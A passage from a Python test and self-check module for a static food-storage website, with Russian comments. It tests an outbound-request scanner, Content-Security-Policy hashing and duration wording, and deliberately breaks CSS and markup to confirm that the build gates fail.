    eq("вид файла: расширения нет вовсе", _serve_kind("robots"), None)

    # СКАНЕР. Объявление передаётся ЯВНО и крошечное: гейт несущих строит
    # свой ввод из настоящего объявления и настолько же с ним согласен, а
    # здесь спрашивается ровно то, чего он спросить не может, — читает ли
    # сканер ТОЛЬКО объявленное и правильно ли делит «идёт браузер» и «идёт
    # человек».
    _CARR = (("src", ("src",), None, "url", "src"),
             ("a_href", ("href",), ("a",), "link", "href у a"),
             ("css_url", (), None, "css_text", "url() в элементе style"))
    eq("сканер: чужой src виден",
       [(k, v, m) for k, _h, v, m
        in _fetch_points('<img src="//e/x.png">', _CARR)],
       [("src", "//e/x.png", "res")])
    eq("сканер: href у a — путь ЧЕЛОВЕКА, а не браузера",
       [(k, v, m) for k, _h, v, m
        in _fetch_points('<a href="/x/">y</a>', _CARR)],
       [("a_href", "/x/", "link")])
    eq("сканер: несущей нет в объявлении — точки нет",
       _fetch_points('<video poster="//e/p.jpg"></video>', _CARR), [])
    eq("сканер: url() в элементе style",
       [(k, v) for k, _h, v, _m in _fetch_points(
           "<style>b{background:url(//e/b.png)}</style>", _CARR)],
       [("css_url", "//e/b.png")])
    eq("сканер: элемент чужой — атрибут не считается",
       _fetch_points('<link href="//e/s.css">', _CARR), [])

    # НЕСУЩИЕ ВТОРОЙ ВОЛНЫ. Спрашивается ровно то, чего гейт несущих
    # спросить не может: он строит свой ввод из объявления и настолько же с
    # ним согласен.
    _CARR2 = (("on_event", ("on*",), None, "js_attr", "обработчик"),
              ("param_value", ("value",), ("param",), "url", "param"),
              ("csp_report", ("content",), ("meta",), "csp", "отчёт"))
    eq("сканер: обработчик — это скрипт",
       [(k, v, m) for k, _h, v, m
        in _fetch_points('<div onclick="fetch(1)"></div>', _CARR2)],
       [("on_event", "fetch()", "js")])
    eq("сканер: из обработчика уезжает ЧИТАТЕЛЬ",
       [(k, v, m) for k, _h, v, m in _fetch_points(
           "<div onmouseover=" + _Q + "location=" + _A + "/x" + _A + _Q
           + "></div>", _CARR2)],
       [("on_event", "присваивание location", "js")])
    eq("сканер: обработчик без сети точкой не считается",
       _fetch_points('<div onclick="this.hidden=1"></div>', _CARR2), [])
    eq("сканер: value у param — адрес",
       [(k, v) for k, _h, v, _m in _fetch_points(
           '<object><param name="movie" value="//e/x.swf"></object>',
           _CARR2)],
       [("param_value", "//e/x.swf")])
    eq("сканер: value у input адресом не считается",
       _fetch_points('<input value="banana">', _CARR2), [])
    eq("сканер: отчёт политики — адрес",
       [(k, v) for k, _h, v, _m in _fetch_points(
           '<meta http-equiv="Content-Security-Policy" content="default-src '
           + _A + "none" + _A + '; report-uri //e/r">', _CARR2)],
       [("csp_report", "//e/r")])
    eq("сканер: обычный meta отчётом не считается",
       _fetch_points('<meta name="description" content="report-uri //e/r">',
                     _CARR2), [])
    eq("сканер: SMIL подменяет адрес",
       [(k, v) for k, _h, v, _m in _fetch_points(
           '<animate attributeName="href" to="//e/y.png"/>',
           (("svg_animate", ("to",), ("animate",), "semilist", "SMIL"),))],
       [("svg_animate", "//e/y.png")])
    eq("сканер: правила предзагрузки — адреса",
       [(k, v) for k, _h, v, _m in _fetch_points(
           '<script type="speculationrules">{"prerender":[{"urls":'
           '["//e/p"]}]}</script>',
           (("speculationrules", (), None, "speculation", "правила"),))],
       [("speculationrules", "//e/p")])

    # ПОЛИТИКА БЕЗОПАСНОСТИ. Хэш считается ДВАЖДЫ разным кодом — в сборке и
    # здесь, — и сверяются они друг с другом: гейт, считающий той же
    # функцией, что и печатает, согласен с собой по построению.
    eq("политика в странице: находится",
       _csp_meta('<meta http-equiv="Content-Security-Policy" '
                 'content="default-src X">'), ["default-src X"])
    eq("политика в странице: другой meta не она",
       _csp_meta('<meta name="description" content="x">'), [])
    eq("политика: разбор директив",
       _csp_dirs("default-src 'none'; img-src data:"),
       [("default-src", ["'none'"]), ("img-src", ["data:"])])
    eq("хэш: встроенный скрипт считается",
       _inline_hashes("<script>void 0</script>", "script"),
       [rd._csp_hash("void 0")])
    eq("хэш: блок данных в политику не идёт",
       _inline_hashes('<script type="application/json">{}</script>',
                      "script"), [])
    eq("политика: без скрипта директива становится 'none'",
       [d for d in rd.csp_value("", "").split("; ")
        if d.startswith("script-src")], ["script-src 'none'"])

    # ОБЛАСТЬ. Файл, который никто не разбирает, выглядит ровно как чистый.
    eq("область: файл стиля читается как стиль",
       [(v, m) for _k, _h, v, m
        in _file_points("s.css", "b{background:url(//e/x.png)}")],
       [("//e/x.png", "res")])
    eq("область: карта сайта читается адресами",
       [(v, m) for _k, _h, v, m
        in _file_points("sitemap.xml", "<loc>//e/x</loc>")],
       [("//e/x", "res")])
    eq("область: скрипт файлом читается приёмами",
       [(v, m) for _k, _h, v, m in _file_points("a.js", 'fetch("//e/x")')],
       [("fetch()", "js")])
    eq("область: необъявленное расширение — не пусто, а None",
       _file_points("logo.webp", "RIFF"), None)
    eq("meta: обновление страницы несёт адрес",
       _meta_values({"http-equiv": "refresh", "content": "0;url=//e/"}),
       [("//e/", "res")])
    eq("meta: карточка шаринга несёт адрес",
       _meta_values({"property": "og:image", "content": "/x.png"}),
       [("/x.png", "res")])
    eq("meta: описание адреса не несёт",
       _meta_values({"name": "description", "content": "hello"}), [])

    # --- ЧИСЛО СЛОВАМИ. Одна функция печатает КАЖДЫЙ срок на сайте, и ни
    #     одного известного ответа у неё до сих пор не было: сломай её —
    #     сломается и страница, и ожидание гейта, который её же и зовёт.
    eq("человеческое: один день", prm.human(1), "1 day")
    eq("человеческое: два дня", prm.human(2), "2 days")
    eq("человеческое: семь дней — неделя", prm.human(7), "1 week")
    eq("человеческое: единица источника сильнее укрупнения",
       prm.human(7, "days"), "7 days")
    eq("человеческое: три недели", prm.human(21, "weeks"), "3 weeks")
    eq("человеческое: месяц", prm.human(30), "1 month")
    eq("человеческое: меньше суток — часы", prm.human(2 / 24.0), "2 hours")
    eq("человеческое: ничего не известно", prm.human(None), "unknown")

    # --- ОТВЕТ ПРОДУКТА. Его печатают витрины, указатель, соседи и
    #     заголовок; гейты витрины сверяют напечатанное С НЕЙ ЖЕ.
    def _mk(slots, units):
        return {"name": "Test", "category": "Dairy Products & Eggs",
                "subcategory": "", "subtitle": "", "id": "1",
                "slots": slots, "units": units, "tips": {}}

    _cold = _mk({"fridge": (5.0, 7.0), "freeze": (90.0, 180.0)},
                {"fridge": "days", "freeze": "days"})
    eq("ответ: осторожный край, и не морозилка",
       prm.answer_value(_cold), "5 days in the fridge")
    # Ждал «2 hours in the pantry» и получил холодильник — ошибалась
    # ПРОВЕРКА, а не функция: у двухчасовой ячейки в том же состоянии есть
    # место получше, и «кончится первым» там значит «положили не туда».
    # Правило записано в hot_slot, и вот два его известных ответа.
    eq("ответ: у ячейки есть место получше — она не связывает",
       prm.answer_value(_mk({"pantry": (2 / 24.0, 2 / 24.0),
                             "fridge": (5.0, 7.0)},
                            {"pantry": "hours", "fridge": "days"})),
       "5 days in the fridge")
    eq("ответ: предел в тепле связывает, когда деться некуда",
       prm.answer_value(_mk({"pantry": (2 / 24.0, 2 / 24.0),
                             "freeze": (90.0, 180.0)},
                            {"pantry": "hours", "freeze": "days"})),
       "2 hours in the pantry")
    # Пятое правило hot_slot, и оно НЕ то же, что «место получше»: то
    # сравнивает ячейки одной группы вскрытия (шкаф против холодильника), а
    # предел в тепле обгоняли ячейки ДРУГОЙ группы — вскрытый холодильник
    # пирога и киша. Пока правила не было, /pies/ и /quiche/ отвечали двумя
    # часами.
    eq("ответ: предел в тепле не связывает при вскрытом холодильнике",
       prm.answer_value(_mk({"pantry": (2 / 24.0, 2 / 24.0),
                             "fridge_open": (3.0, 5.0)},
                            {"pantry": "hours", "fridge_open": "days"})),
       "3 days in the fridge once opened")
    eq("ответ: одна морозилка — отвечает морозилка",
       prm.answer_value(_mk({"freeze": (90.0, 180.0)}, {"freeze": "days"})),
       "90 days in the freezer")
    # У кратности ЕСТЬ НАПРАВЛЕНИЕ, и однажды девять страниц напечатали его
    # наоборот. Здесь оно зафиксировано известным ответом.
    _hr = prm.headline_ratio(_cold)
    eq("кратность: считается от холодильника к морозилке",
       (_hr[0], _hr[1].den_key, _hr[1].num_key), ("freeze", "fridge",
                                                  "freeze"))
    eq("кратность: величина", round(_hr[1].r, 2), 25.71
       )

    ok = True
    for name, got, want in cases:
        if got != want:
            print("  ЧИСТАЯ ФУНКЦИЯ ОШИБЛАСЬ  %s: ждали %r, вышло %r"
                  % (name, want, got))
            ok = False
        else:
            print("  верно             %s" % name)
    return ok


def stamp_selftest():
    """Известные ответы. Ломаем по одному входу и требуем нужный вердикт."""
    from datetime import date as _d
    day = _d(2026, 9, 1)
    old = {"hash": "aaaa", "date": "2026-09-01"}
    now = _d(2026, 9, 5)
    cases = [
        ("текст изменился, дата стоит на месте", "bbbb", day, old, now, True),
        ("ничего не изменилось", "aaaa", day, old, now, False),
        ("текст изменился и дата сдвинута", "bbbb", _d(2026, 9, 2), old, now,
         False),
        ("эталона ещё нет", "bbbb", day, None, now, False),
        ("правка в тот же день, который названа датой", "bbbb", day, old, day,
         False),
        ("дата в будущем", "bbbb", _d(2026, 9, 9),
         {"hash": "aaaa", "date": "2026-09-09"}, now, False),
    ]
    ok = True
    for name, h, d, o, n, want in cases:
        got = stamp_verdict(h, d, o, n) is not None
        if got != want:
            print("  ОТПЕЧАТОК ОШИБСЯ  %s: ждали %s, вышло %s"
                  % (name, want, got))
            ok = False
        else:
            print("  верно             отпечаток: %s" % name)
    return ok


# ------------------------------------------------------------ самопроверка

_SAVED = {}


def _must_change(c, key, text):
    """Подстановка в отданную страницу, которая ОБЯЗАНА что-то изменить.

    Вторая половина того же урока, что и `_css_swap`: поломка, чей шаблон
    уехал вместе с правкой текста, не меняет ничего, гейт остаётся зелёным, а
    самопроверка печатает «ГЕЙТ НЕ СРАБОТАЛ» — и читается это как изъян
    гейта. 16.09.2026 главная научилась печатать ничью («is shared by»
    вместо «belongs to»), и ДВЕ поломки из трёх промахнулись молча.
    """
    if c[key] == text:
        raise AssertionError(
            "поломка разметки промахнулась мимо цели: %s не изменилась" % key)
    c[key] = text


def _css_swap(old, new, ad=False):
    """Подмена в облике, которая ОБЯЗАНА найти цель.

    Поломка, чей литерал уехал вместе с правкой стиля, не меняет НИЧЕГО:
    гейт остаётся зелёным, самопроверка печатает «ГЕЙТ НЕ СРАБОТАЛ», и
    читается это как изъян гейта, а не как промах поломки — время уходит не
    туда. Переодевание сайта 16.09.2026 разом увело четыре таких литерала
    (`--hair`, `--pad` и дважды клетку сетки рельсы), и нашлись они не
    самопроверкой, а отдельным проходом по всем литералам.

    Здесь промах ПАДАЕТ и называет строку, по которой целился.
    """
    import design
    _SAVED.setdefault("css", design.CSS)
    _SAVED.setdefault("ad", design.AD_CSS)
    src = design.AD_CSS if ad else design.CSS
    if old not in src:
        raise AssertionError(
            "поломка облика промахнулась мимо цели: «%s» нет в %s"
            % (old, "AD_CSS" if ad else "CSS"))
    if ad:
        design.AD_CSS = src.replace(old, new, 1)
    else:
        design.CSS = src.replace(old, new, 1)


def _break_ad_css(c):
    """Подменить размер в CSS и вернуть обратно нельзя: гейт читает модуль.
    Поэтому ломаем на время проверки и чиним сразу после."""
    _css_swap("width:728px;height:90px", "width:700px;height:90px", ad=True)


def _break_corpus_slot(_c):
    """Разбор ПОТЕРЯЛ ячейку: величина в источнике есть, на странице её нет.

    Ломается не разметка, а корпус: гейт молчания читает СЫРОЙ файл и корпус,
    и именно расхождение между ними обязан заметить.
    """
    import render as rd
    _SAVED["corpus"] = rd.load_corpus
    real = rd.load_corpus

    raw = json.load(io.open(fk.RAW, encoding="utf-8"))
    byid = {str(x["id"]): x for x in raw["product_data"]}
    fld = {k: f for k, f, _l in fk.SLOTS}
    keys = _SOURCE_FAMILIES["freeze"]

    def maimed():
        items, ranks, ctx = real()
        for it in items:
            # Продукт обязан быть ВЫПУЩЕН и обязан нести число в сырой
            # ячейке: иначе терять нечего, и поломка промахнётся мимо цели.
            if "%s/index.html" % it["slug"] not in _c:
                continue
            ids = [str(x) for x in (it.get("row_ids") or [it["id"]])]
            if not any(_raw_is_a_figure((byid.get(i) or {}).get(fld[k], ""))
                       for i in ids for k in keys):
                continue
            for st in (it.get("states") or []):
                for k in keys:
                    (st.get("slots") or {}).pop(k, None)
            for k in keys:
                (it.get("slots") or {}).pop(k, None)
            return items, ranks, ctx
        return items, ranks, ctx
    rd.load_corpus = maimed


def _break_ad_out_of_flow(_c):
    """Место, выведенное из потока: в потоке коробки не налезают."""
    _css_swap(".ad-rail{width:300px", ".ad-rail{position:absolute;width:300px",
              ad=True)


def _break_ad_clipper(_c):
    """Новый обрезающий предок, не объявленный обрезающим."""
    _css_swap(".stub{padding", ".stub{overflow:hidden;padding")


def _break_ad_grid(_c):
    """Две клетки сетки, назначенные одному месту."""
    _css_swap(".sheet > .ad{grid-column:2;grid-row:1/span 3}",
              ".sheet > .ad{grid-column:1;grid-row:1/span 3}")


def _restore_ad_css():
    import design
    if "ad" in _SAVED:
        design.AD_CSS = _SAVED.pop("ad")


def _break_head_terms(_c):
    """Список запросов, переставший что-либо находить, — рычаг, которого нет."""
    import render as rd
    _SAVED["head"] = rd.HEAD_TERMS
    rd.HEAD_TERMS = tuple(rd.HEAD_TERMS) + ("unobtainium sandwich",)


def _break_ad_fit(_c):
    """Размер, СОГЛАСОВАННЫЙ с CSS и всё равно не влезающий в свою колонку.

    Ломать только CSS мало: тогда краснеет сверка объявления с CSS, а расчёт
    «влезает ли» остаётся непроверенным — ровно то состояние, в котором
    прежний гейт сравнивал ширину из CSS с той же шириной из CSS.
    """
    import design
    import render as rd
    _SAVED["slots"] = rd.AD_SLOTS
    _SAVED.setdefault("ad", design.AD_CSS)
    rd.AD_SLOTS = dict(rd.AD_SLOTS)
    rd.AD_SLOTS["ad-flow"] = ((0, 728, 90),)
    design.AD_CSS = re.sub(
        r"\.ad-flow\{width:\d+px;height:\d+px\}",
        ".ad-flow{width:728px;height:90px}", design.AD_CSS)
    design.AD_CSS = design.AD_CSS.replace(
        "  .ad-flow{width:336px;height:280px}\n", "")


def _break_top_links(_c):
    """Объявленный вход, которого нет в разметке. Ровно так `TOP_LINKS` и
    прожил редизайн: константа осталась, отрисовка исчезла."""
    import render as rd
    _SAVED["top"] = rd.TOP_LINKS
    rd.TOP_LINKS = tuple(rd.TOP_LINKS) + (("/nowhere/", "Nowhere"),)


def _break_ads_off(_c):
    """Гейт, выключающийся тем же флагом, что и то, что он проверяет, — это
    не гейт. Так было у соседа: проверка размера начиналась с `if not ADS`."""
    import render as rd
    _SAVED["ads"] = rd.ADS
    rd.ADS = False


def _break_contrast(_c):
    """Вернуть тихой линии значение из макета направления: 1,30:1 на бумаге.

    Это не выдуманное число: ровно #dfe2ea нарисовал автор «Даты, а не
    срока», и вся структура реестра оказалась бы ниже графического минимума.
    """
    _css_swap("--hair:#8b92a3;", "--hair:#dfe2ea;")


def _break_spacing(_c):
    """Отступ, набранный руками: ровно те 9px, что нашёл разбор облика."""
    _css_swap(
        ".strip{display:flex;flex-wrap:wrap;justify-content:space-between;",
        ".strip{display:flex;flex-wrap:wrap;justify-content:space-between;"
        "margin-top:9px;")


def _break_base(_c):
    """База, переставшая быть базой: --pad объявлен числом."""
    _css_swap("--pad:calc(var(--u)*4);", "--pad:14px;")


def _break_spacing_empty(_c):
    """Ни одного отступа в облике: пустая выборка обязана краснеть."""
    import design
    _SAVED.setdefault("css", design.CSS)
    _SAVED.setdefault("ad", design.AD_CSS)
    design.AD_CSS = ".ad{overflow:hidden}"
    design.CSS = (":root{--u:4px;--pad:calc(var(--u)*3);"
                  "--rad:calc(var(--u)*2);--f1:12px;--f2:15px;--f3:18px;"
                  "--f4:22px;--d1:clamp(30px,9.4vw,46px);"
                  "--d2:clamp(21px,6vw,29px)}body{font-size:var(--f2)}")


def _break_size_offscale(_c):
    """Кегль мимо шкалы: те самые 13,5px основного текста."""
    _css_swap(".quiet{color:var(--ink2)}",
              ".quiet{color:var(--ink2);font-size:13.5px}")


def _break_size_body(_c):
    """Основной текст мельче 15px — ровно то, что было."""
    _css_swap("--f2:15px;", "--f2:13.5px;")


def _break_size_steps(_c):
    """Две ступени в полупикселе друг от друга — это не иерархия."""
    _css_swap("--f3:18px;", "--f3:16px;")


def _break_tracking_inherited(_c):
    """Потомок, снова наследующий абсолютный трекинг родителя.

    Ровно тот дефект, что стоял на 295 карточках: у `.ask` снимается
    собственный `letter-spacing:normal`, и -.04em, посчитанные на `.item`
    при 60px, приходят к нему как -2.4px при кегле 15px.
    """
    _css_swap("letter-spacing:normal;line-height:1.4}", "line-height:1.4}")


def _break_size_empty(_c):
    """Ни одного кегля в облике."""
    import design
    _SAVED.setdefault("css", design.CSS)
    _SAVED.setdefault("ad", design.AD_CSS)
    design.AD_CSS = ".ad{overflow:hidden}"
    design.CSS = (":root{--u:4px;--pad:calc(var(--u)*3);"
                  "--rad:calc(var(--u)*2);--f1:12px;--f2:15px;--f3:18px;"
                  "--f4:22px;--d1:clamp(30px,9.4vw,46px);"
                  "--d2:clamp(21px,6vw,29px)}body{margin:0}")


def _break_label_budget(c):
    """Бирка, переставшая помещаться на экран: лишнее поле над перфорацией."""
    for k in list(c):
        if '<div class="label">' in c[k] and '"product"' in c[k]:
            c[k] = c[k].replace(
                '<div class="hot">',
                '<div class="field"><div class="cap">Extra</div>'
                '<div class="dur">Something long enough to wrap twice over '
                'and then some more</div></div><div class="hot">', 1)
            return


def _break_label_empty(c):
    """Ни одной бирки товара в выкладке."""
    for k in list(c):
        if '<div class="label">' in c[k]:
            c[k] = c[k].replace('content="product"', 'content="page"')


def _restore_all():
    import design
    import render as rd
    _restore_ad_css()
    if "head" in _SAVED:
        rd.HEAD_TERMS = _SAVED.pop("head")
    if "slots" in _SAVED:
        rd.AD_SLOTS = _SAVED.pop("slots")
    if "ads" in _SAVED:
        rd.ADS = _SAVED.pop("ads")
    if "top" in _SAVED:
        rd.TOP_LINKS = _SAVED.pop("top")
    if "css" in _SAVED:
        design.CSS = _SAVED.pop("css")
    if "corpus" in _SAVED:
        rd.load_corpus = _SAVED.pop("corpus")
    if "food_kind" in _SAVED:
        fk.food_kind = _SAVED.pop("food_kind")
    if "clause" in _SAVED:
        fk.reason_clause = _SAVED.pop("clause")
    if "cap" in _SAVED:
        fk.SAFETY_LIMIT_MAX_DAYS = _SAVED.pop("cap")
    if "not_animal" in _SAVED:
        fk.NOT_ANIMAL_WORDS = _SAVED.pop("not_animal")
    if "plain" in _SAVED:
        fk.PLAIN_MEANS.clear()
        fk.PLAIN_MEANS.update(_SAVED.pop("plain"))
    if "fetch_points" in _SAVED:
        globals()["_fetch_points"] = _SAVED.pop("fetch_points")
    if "carriers" in _SAVED:
        rd.FETCH_CARRIERS = _SAVED.pop("carriers")
    if "served" in _SAVED:
        rd.SERVED_KINDS = _SAVED.pop("served")
    if "file_points" in _SAVED:
        globals()["_file_points"] = _SAVED.pop("file_points")
    if "csp" in _SAVED:
        rd.CSP_POLICY = _SAVED.pop("csp")
    if "governs" in _SAVED:
        rd.CSP_GOVERNS.clear()
        rd.CSP_GOVERNS.update(_SAVED.pop("governs"))


def selftest():
    """Каждый гейт ломается нарочно и обязан покраснеть."""
    import render as rd
    import prose as pr_mod
    files, _stats, _acc = rd.assemble()
    print("собрано файлов: %d" % len(files))
    if run(files, quiet=True):
        print("СБОРКА НЕ ПРОХОДИТ СОБСТВЕННЫЕ ГЕЙТЫ")
        run(files)
        return 1

    # Заголовок несёт класс: поломка, ищущая голый «<h1>», промахивается
    # мимо цели и оставляет гейт непроверенным.
    H1 = '<h1 class="item">'

    any_page = next(p for p in files if p.count("/") == 1
                    and p.endswith("index.html"))
    other = next(p for p in files if p != any_page and p.count("/") == 1
                 and p.endswith("index.html"))
    # Опоры ищутся В СОБРАННОМ. Вписанное имя страницы переживает не каждую
    # пересборку корпуса, а поломка, промахнувшаяся мимо цели, оставляет гейт
    # непроверенным — и выглядит это ровно как пройденная самопроверка.
    prods = _products(files)
    dated = next(p for p, t in sorted(prods.items())
                 if 'data-clock="opened" data-label=' in t
                 and re.search(r'data-hi="([1-9][0-9]*)"', t))
    dated_hi = re.search(r'data-hi="([1-9][0-9]*)"', prods[dated]).group(1)
    dated_cap = re.search(r'<div class="hot">\s*<div class="cap">(.*?)</div>',
                          prods[dated], re.S).group(1)
    kinded = next(p for p, t in sorted(prods.items())
                  if '<h3 class="kind">' in t)
    kind_head = re.search(r'<h3 class="kind">.*?</h3>', prods[kinded]).group(0)
    plain = next(p for p, t in sorted(prods.items())
                 if '<h3 class="kind">' not in t)
    nb_href = re.search(r"<h2>Items that behave the same way</h2>.*?"
                        r'<ul class="near"[^>]*><li><a href="([^"]+)"',
                        prods[plain], re.S).group(1)
    calc_page = next(p for p, t in sorted(prods.items())
                     if '<span class="calc">' in t)
    # ДВА НОСИТЕЛЯ ОДНОЙ ВЕЛИЧИНЫ, и каждый ломается ОТДЕЛЬНО. Ответ
    # страницы живёт в `.out` (та же ячейка до и после ввода даты), второе
    # окно — в `.dur`. Пока поломка целилась только в `.dur`, проверка
    # главного числа сайта не была доказана ни разу: носитель расщепился при
    # смене облика, а поломка осталась на прежней половине.
    dur_page = next(p for p, t in sorted(prods.items())
                    if '<div class="dur">' in t)
    out_page = next(p for p, t in sorted(prods.items())
                    if '<div class="out" ' in t)
    no_freeze_page = next(
        p for p, t in sorted(prods.items())
        if ("not an option here" in t or "no colder option" in t)
        and ('<span class="rk">In the freezer</span>'
             '<span class="rv">not recommended</span>') in t)

    # Опоры разные у разных поломок: страница без морозильного числителя
    # переживёт подмену подписи, не изменившись, и гейт останется
    # непроверенным на этой ветке.
    cost_page = next(p for p, t2 in sorted(prods.items())
                     if '<div class="cost">' in t2)
    cost_x = re.search(r'<div class="x">([0-9.]+)&times;', prods[cost_page])
    cost_x = cost_x.group(1)
    frozen_page = next(p for p, t2 in sorted(prods.items())
                       if re.search(r'<span class="calc">[0-9]+ days frozen',
                                    t2))
    mult_page = next(p for p, t2 in sorted(prods.items())
                     if '<div class="cost">' in t2
                     and re.search(r"[0-9.]+ times", _visible(t2)))
    mult_x = re.search(r'<div class="x">([0-9.]+)&times;',
                       prods[mult_page]).group(1)
    listed = next(p for p, t2 in sorted(_html(files).items())
                  if re.search(r'<li><a href="/[^/"]+/"><span class="n">'
                               r'[^<]*</span><span class="v">[0-9]', t2))
    listed_v = re.search(r'<li><a href="/[^/"]+/"><span class="n">[^<]*'
                         r'</span><span class="v">([0-9][^<]*)',
                         _html(files)[listed]).group(1)
    tip_page = next(p for p, t2 in sorted(prods.items())
                    if '<p class="tip">' in t2)
    tip_txt = re.search(r'<p class="tip"><b>[^<]*</b> ([^<]+)</p>',
                        prods[tip_page]).group(1)
    says_page = next(p for p, t2 in sorted(prods.items())
                     if "answers in words instead of days" in t2)
    says_val = next(v for v in sorted(set(pr_mod.SAYS_VALUE.values()))
                    if v in prods[says_page])
    _corp = {x["slug"]: x for x in __import__("render").load_corpus()[0]}
    pantry_says_page = next(
        p for p in sorted(prods)
        if p[:-len("/index.html")] in _corp
        and any(k.startswith("pantry")
                for _s2, k, _c2, _r2 in
                pr_mod.says_all(_corp[p[:-len("/index.html")]])))
    excl_says_page = next(
        p for p in sorted(prods)
        if p[:-len("/index.html")] in _corp
        and ({k.split("_")[0] for _s2, k, _c2, _r2
              in pr_mod.says_all(_corp[p[:-len("/index.html")]])}
             - pr_mod.families(_corp[p[:-len("/index.html")]])))
    warm_page = next(p for p, t2 in sorted(prods.items())
                     if "prints no multiplier against the room-temperature"
                     in t2)
    pct_page = next(p for p, t2 in sorted(prods.items())
                    if re.search(r"keeps longer than [0-9]+% of",
                                 _visible(t2)))
    title_page = next(p for p, t2 in sorted(prods.items())
                      if re.search(r"<title>[^<]*: [0-9]", t2))

    # Опоры для оговорок. Ищутся В СОБРАННОМ по признаку, а не по имени:
    # вписанное имя страницы переживает не каждую пересборку корпуса, а
    # поломка, промахнувшаяся мимо цели, оставляет гейт непроверенным.
    _chip_s = pr.MEANS_CHIP["safety"]
    _chip_q = pr.MEANS_CHIP["quality"]
    safety_page = next(p for p, t2 in sorted(prods.items())
                       if '<div class="means">%s</div>' % _chip_s in t2)
    quality_page = next(p for p, t2 in sorted(prods.items())
                        if '<div class="means">%s</div>' % _chip_q in t2)
    # Страница, ВСЕ окна которой одного вида: только на такой чужое
    # последствие обязано краснеть.
    def _one_kind(slug):
        it2 = _corp.get(slug)
        if not it2:
            return False
        ks = {_kind_of(it2, k, v[1], st2)
              for st2 in pr.states_of(it2)
              for k, v in st2["slots"].items() if v[0] != "no"}
        return ks == {"safety"}
    pure_safety = next(p for p in sorted(prods)
                       if _one_kind(p[:-len("/index.html")]))
    std_page = next(p for p, t2 in sorted(prods.items())
                    if "<span data-std>" in t2)
    # Опора для признака порчи: страница с окном качества и та из шести фраз,
    # которая на ней стоит. Ищется В СОБРАННОМ: имя страницы переживает не
    # всякую пересборку корпуса, а поломка мимо цели оставляет гейт
    # непроверенным и выглядит как пройденная самопроверка.
    look_page, look_own = next(
        (p, s) for p, t2 in sorted(prods.items())
        for s in pr.LOOK_ALL if s in t2)
    look_other = next(s for s in pr.LOOK_ALL if s != look_own)
    wrong_page = next(p for p, t2 in sorted(prods.items())
                      if "Two places, and one of them is the wrong one" in t2)
    wrong_worse = pr.SLOT_LABEL[
        pr.wrong_place_rows(_corp[wrong_page[:-len("/index.html")]])[0][1]]
    scope_page = next(p for p, t2 in sorted(prods.items())
                      if pr.SCOPE_HEAD in t2)
    scope_note = re.search(r"reads .([^.]*applies[^.]*)", _visible(
        prods[scope_page])).group(1)
    nofreeze_page = next(
        p for p, t2 in sorted(prods.items())
        if "marks the freezer as not recommended" in _visible(t2))

    # Опоры для поиска, навигации и слов запроса. Ищутся В СОБРАННОМ по
    # признаку, а не по имени страницы: вписанное имя переживает не каждую
    # пересборку корпуса, а поломка, промахнувшаяся мимо цели, оставляет гейт
    # непроверенным — и выглядит это ровно как пройденная самопроверка.
    q_sing = next(p for p, t2 in sorted(prods.items())
                  if ">How long does</span>" in t2)
    q_plur = next(p for p, t2 in sorted(prods.items())
                  if ">How long do</span>" in t2)
    _dm = [(p, re.search(r'<meta name="description" content="[^"]*?How long '
                         r'(?:[^"]+?) (keeps)\b', t2))
           for p, t2 in sorted(prods.items())]
    desc_page, _dmm = next((p, m) for p, m in _dm if m)
    desc_verb = _dmm.group(0)
    _prod_hrefs = ["/%s/" % p[:-len("/index.html")] for p in prods]
    _rank_hrefs = [h for h, _t in rd.TOP_LINKS if h != "/all/"]

    def _kill_sideways(c):
        """Ни одного хода на другой продукт — при живых рубрике и витринах."""
        t2 = c[prod_page]
        for h in _prod_hrefs:
            t2 = t2.replace('href="%s"' % h, 'href="/all/"')
        c[prod_page] = t2

    def _kill_rankings(c):
        t2 = c[prod_page]
        for h in _rank_hrefs:
            t2 = t2.replace('href="%s"' % h, 'href="/all/"')
        c[prod_page] = t2

    # Опоры новых поломок ищутся В СОБРАННОМ, как и все прочие.
    claim_page = next(p for p, t2 in sorted(prods.items())
                      if "that get no pantry time at all" in t2)
    claim_m = re.search(r"as for (\d+) of the (\d+) foods in the data that "
                        r"get no pantry time at all", prods[claim_page])
    claim_n, claim_total = claim_m.group(1), claim_m.group(2)
    names_page = next(p for p, t2 in sorted(prods.items())
                      if '<ul class="rows" data-names="1">' in t2)
    name_row = re.search(r'<ul class="rows" data-names="1"><li>'
                         r'<span class="rk">([^<]*)</span>'
                         r'<span class="rv">([^<]*)</span></li>',
                         prods[names_page])
    name_nm, name_val = name_row.group(1), name_row.group(2)

    def _reword_claim(c):
        """Фразу переписали, а проверку — нет: гейт обязан сказать об этом,
        а не промолчать, не найдя своего образца."""
        for k2, v2 in list(c.items()):
            if k2.endswith(".html"):
                c[k2] = v2.replace(
                    "foods in the data that get no pantry time at all",
                    "foods in the file with no pantry time")

    def _drop_name_rows(c):
        for k2, v2 in list(c.items()):
            if k2.endswith(".html"):
                c[k2] = re.sub(r'<ul class="rows" data-names="1">.*?</ul>',
                               "", v2, flags=re.S)

    def _kill_own_prose(c):
        """Своя проза исчезает у ОДНОЙ страницы, полный текст остаётся тем
        же: ловит это только мерка по всей странице."""
        c[other] = c[any_page].replace("</h2><p", "</h2><!-- --><p")

    def _strip_h2(c):
        for k2, v2 in list(c.items()):
            if k2.endswith(".html"):
                c[k2] = v2.replace("<h2>", "<b>").replace("</h2>", "</b>")

    def _skeleton_twin(c):
        """Пара, у которой РАЗНЫЕ числа и один скелет. Мерка с числами её не
        видит (совпадений нет вовсе), своя проза различна — краснеть обязана
        ровно ветка скелета."""
        alpha = [chr(97 + a) + chr(97 + b) for a in range(26)
                 for b in range(26)]
        head = ('<meta name="page-type" content="twintest">'
                "<body><h2>Head</h2><p>%s</p><p>%s</p></body>")
        uniq = ("alpha bravo charlie delta echo",
                "kilo lima mike november oscar")
        for n, (u, shift) in enumerate(zip(uniq, (0, 1000))):
            body = " ".join("%s %d" % (alpha[i], i + shift)
                            for i in range(300))
            c["twintest-%d/index.html" % n] = head % (u, body)

    def broken(fn):
        c = dict(files)
        fn(c)
        return c

    breaks = [
        ("язык страницы английский",
         lambda c: c.__setitem__(any_page,
                                 c[any_page].replace(H1, H1 + "Срок "))),
        ("нет управляющих байтов",
         lambda c: c.__setitem__(any_page, c[any_page] + chr(1))),
        ("браузер не ходит наружу",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             "</body>", '<img src="cdn.example.com/x.png"></body>'))),
        ("скрипт один, встроенный, короткий",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             "</body>", '<script src="/x.js"></script></body>'))),
        ("голова страницы заполнена верно",
